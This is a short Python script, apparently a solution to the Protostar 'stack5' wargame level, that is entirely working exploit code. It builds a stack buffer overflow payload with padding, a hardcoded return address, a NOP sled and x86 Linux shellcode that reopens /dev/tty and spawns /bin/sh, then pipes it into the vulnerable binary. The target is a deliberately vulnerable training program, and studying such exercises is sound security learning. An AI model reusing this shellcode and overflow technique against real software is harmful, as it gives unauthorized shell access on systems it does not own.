
import os
import struct


# stack - 0xbffff7b0
sploit = "A"*76 + "\xd6\xf7\xff\xbf" + "\x90" * 200
#sploit += "\xCC"*20
sploit += "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

with open("/tmp/stack5_sploit", "wb") as f:
	f.write(sploit)
os.system("/opt/protostar/bin/stack5 < /tmp/stack5_sploit")
os.remove("/tmp/stack5_sploit")
